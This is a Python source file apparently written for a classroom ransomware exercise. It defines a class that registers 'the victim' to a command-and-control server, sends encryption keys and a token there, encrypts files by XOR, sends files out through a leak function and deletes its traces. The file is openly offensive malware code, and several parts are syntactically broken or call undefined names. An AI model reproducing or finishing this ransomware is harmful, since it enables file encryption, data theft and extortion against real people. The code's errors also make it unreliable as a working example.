from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:

        # Derive a key from a salt and a key
        kdf = PBKDF2HMAC(# derive a key from a password
            algorithm=hashes.SHA256(),# use SHA256
            length=self.KEY_LENGTH,# length of the key
            salt=salt,# salt
            iterations=self.ITERATION,# number of iteration
        )
        return kdf.derive(key)



    def create(self)->Tuple[bytes, bytes, bytes]:
        raise NotImplemented()


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        payload=# payload to send
        {
        "token" : self.bin_to_b64(token),# token in base64
        "salt" : self.bin_to_b64(salt),# salt in base64
        "key" : self.bin_to_b64(key)# key in base64
        }
        requests.post(f"http://{self._remote_host_port}/new", json=payload)# Path: sources/secret_manager.py

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        salt,key,tokens = self.create()# create crypto data
        self.post_new(salt, key, tokens)# register malware to cnc
        self.salt = salt# set salt
        self.key = key# set key
        self.token = tokens# set token
        #if token not exist
        if not os.path.exists(os.path.join(self._path, "token.bin")):# Path: sources/secret_manager.py
            with open(folder_token_name + "/token.bin", "wb") as f:
             f.write(self.token)

        with open(folder_token_name + "/salt.bin", "wb") as f:
             f.write(self._salt)

            self.post_new(self._salt, key, tokens["token"])
             
    def load(self)->None:
        # function to load crypto data from the target
        with open(os.path.join(self._path, "salt.bin"), "rb") as f:
            self._salt = f.read()# load salt
        with open(os.path.join(self._path, "token.bin"), "rb") as f:
            self._token = f.read()#load token

    def check_key(self, candidate_key:bytes)->bool:
        # Get the token user
        USER_TOKEN = self.get_hex_token()
         
        payload = {# payload to send to verify the key
            "token" : self.bin_to_b64(USER_TOKEN),# token in base64
            "key" : self.bin_to_b64(candidate_key)# key in base64
        }
        REQUETE = requests.post(f"http://{self._remote_host_port}/check", json=payload)
        if REQUETE ["status"] == 1:
            return True
        else:
            return False



    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        with open(os.path.join(self._path, "token.bin"), "rb") as f:
            TOKEN = f.read()

        return TOKEN

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for f in files:
            xorfile(f, self._key)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        post_file(files, self._remote_host_port, self._token)
        

    def clean(self):
        # remove crypto data from the target
        os.remove(os.path.join(self._path, "token.bin"))
        os.remove(os.path.join(self._path, "salt.bin"))
